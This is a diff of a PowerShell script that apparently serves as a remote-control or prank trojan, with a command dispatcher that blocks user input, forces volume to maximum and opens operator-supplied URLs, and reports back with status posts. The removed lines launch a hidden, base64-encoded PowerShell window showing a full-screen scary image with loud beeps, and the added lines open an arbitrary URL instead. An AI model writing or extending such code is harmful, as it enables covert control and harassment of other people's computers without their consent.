@@ -344,7 +344,7 @@ public class IB {
 }
 
 # ---- Jumpscare ----
-function Jump-Scare{
+function Jump-Scare($url){
   try{
     $vol=@'
 using System;
@@ -356,35 +356,9 @@ public class Vol {
 '@
     Add-Type -TypeDefinition $vol
     [Vol]::Max()
-    $inner=@'
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$f=New-Object Windows.Forms.Form
-$f.FormBorderStyle='None'
-$f.WindowState='Maximized'
-$f.TopMost=$true
-$f.BackColor=[Drawing.Color]::Black
-$f.ControlBox=$false
-$pb=New-Object Windows.Forms.PictureBox
-$pb.Dock='Fill'
-$pb.SizeMode='StretchImage'
-$bmp=New-Object Drawing.Bitmap 800,600
-$g=[Drawing.Graphics]::FromImage($bmp)
-$g.Clear([Drawing.Color]::Black)
-$g.FillEllipse([Drawing.Brushes]::Red,160,120,140,140)
-$g.FillEllipse([Drawing.Brushes]::Red,500,120,140,140)
-$g.FillEllipse([Drawing.Brushes]::Black,205,165,60,60)
-$g.FillEllipse([Drawing.Brushes]::Black,545,165,60,60)
-$pen=New-Object Drawing.Pen ([Drawing.Color]::White),12
-$g.DrawArc($pen,180,320,440,220,0,180)
-$pb.Image=$bmp
-$f.Controls.Add($pb)
-$f.Add_Shown({ [console]::beep(150,1200); [console]::beep(140,1200); [console]::beep(130,1500); [console]::beep(120,2000) })
-$f.ShowDialog()
-'@
-    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
-    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
-    Post '`[+] jumpscare triggered`'
+    if(-not $url){ $url='https://www.youtube.com/watch?v=dQw4w9WgXcQ' }
+    Start-Process $url
+    Post '`[+] jumpscare: volume 100% + video opened`'
   }catch{ Post '`[!] jumpscare failed' }
 }
 
@@ -392,7 +366,8 @@ $f.ShowDialog()
 function Run-Cmd($c){
   try{
     if($c -eq 'block'){ Block-Input }
-    elseif($c -eq 'jumpscare'){ Jump-Scare }
+    elseif($c -eq 'jumpscare'){ Jump-Scare $null }
+    elseif($c -like 'jumpscare:*'){ Jump-Scare ($c.Substring(10)) }
     elseif($c -like 'setup:*'){
       $rest=$c.Substring(6)
       $parts=$rest -split ';', 2
